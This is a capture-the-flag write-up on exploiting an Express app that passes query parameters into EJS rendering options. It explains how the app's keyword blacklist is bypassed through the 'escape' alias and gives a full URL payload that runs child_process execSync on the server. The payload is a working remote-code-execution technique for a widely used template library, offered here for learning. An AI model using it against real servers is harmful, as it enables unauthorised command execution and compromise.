

`Author: eliyah`

`Challenge: Express Javascript Security`

# Overview

We are given a url to the site and the site code which you can find in the challenge directory.

The website has 2 endpoints. Root (`/`) endpoint and the `/greet` endpoint. On the first one is a form that just sends you to the `/greet` endpoint with some query parameters set (font, fontSize, name). With the given parameters second endpoint just returns page with hello message styled with selected font and size.

`http://ejs.web.seetf.sg:1337/`:

![Screenshot](ss1.png)

=> `http://ejs.web.seetf.sg:1337/greet?name=someName&font=Arial&fontSize=20`:

![Screenshot](ss2.png)

Also, in the docker container there is `/readflag` executable that outputs the flag to stdout. 

# Code examination and solution

Because of this section of code in the main.js the function that is used for rendering ejs templates is [renderFile](https://github.com/mde/ejs/blob/main/lib/ejs.js#L441).
```js
// main.js

// ejs v3.1.9
app.set('view engine', 'ejs');
```


Array of filters that mustn't be found in the request query:

```js
// main.js

const BLACKLIST = [
    "outputFunctionName",
    "escapeFunction",
    "localsName",
    "destructuredLocals"
]
```

The vulnerable function:

```js
// main.js

app.get('/greet', (req, res) => {
    
	const data = JSON.stringify(req.query);
    	if (BLACKLIST.find((item) => data.includes(item))) {
        	return res.status(400).send('Can you not?');
   	}
	
    // Vulnerability is here
	// because the req.query object is passed 
	// directly to the render function.
    // This is not good practice because 
    // an adversary can make use of the 
    // rendering options.
    return res.render('greet', { 
    	...JSON.parse(data),
    	cache: false
    });
});
```
- *Rendering options can also be passed through the data argument of the renderFile function through the settings object. [RENDERING OPTIONS](https://github.com/mde/ejs/blob/main/docs/jsdoc/options.jsdoc)*

Parts of [renderFile](https://github.com/mde/ejs/blob/main/lib/ejs.js#L441):
```js
// github repo: mde/ejs
// lib/ejs.js

exports.renderFile = function(){
	//... 
	if (data.settings) {
		//...
		viewOpts = data.settings['view options'];
        	if (viewOpts) {
          		utils.shallowCopy(opts, viewOpts);
        	}
	}
	//...
	
}
```
- *When there is only one argument(data) specified in the render call the function copies rendering options from the `data`'s `settings[view options]` field. With this in mind I could pass url like `http://ejs.web.seetf.sg:1337?settings[view options][escape]=...` and it will set the option `escape` to the passed value.*

Because of the BLACKLIST filters some template render options cannot be used. Fortunately in the BLACKLIST there is only `escapeFunction` option and not it's alias `escape`. What I can do with this?

I took another look at the ejs source and i found something interesting.

- *When rendering template, ejs is dynamically creating function that will assemble the template with the data passed to it. The function is compiled from the string which is dynamically created based on the template. All of this is happening in the [compile](https://github.com/mde/ejs/blob/main/lib/ejs.js#L441) function of the `Template` class that eventually gets called.*

Parts of [Template.compile](https://github.com/mde/ejs/blob/main/lib/ejs.js#L441):
```js
// github repo: mde/ejs
// lib/ejs.js

Template.prototype={
    //...
    compile = function() {
	//...
	var escapeFn = opts.escapeFunction;
	//...
	if (opts.client) {
		// src is the string containing the source code of the function that assembles the template
     		src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
    	}
}
```

Looking at this piece of code it looks like that I can pass my own function to the escapeFn if the opts.client is true. 

- *The `escapeFn` is called for the every variable name found between delimiters `<%=` and `%>`. In short, every appearance of the `<%= var_name %>` is replaced with the result value of `escapeFn(var_name)`.
You can find it in [this function](https://github.com/mde/ejs/blob/main/lib/ejs.js#L815).*

So I tried with the payload:

```
http://ejs.web.seetf.sg:1337/greet?settings[view%20options][escape]=function(){return%20process.mainModule.require(%27child_process%27).execSync(%27/readflag%27)}&font=aaa&fontSize=aaa&settings[view%20options][client]=true&name=aaa
```

And it was successful :D

![Screenshot](ss3.png)




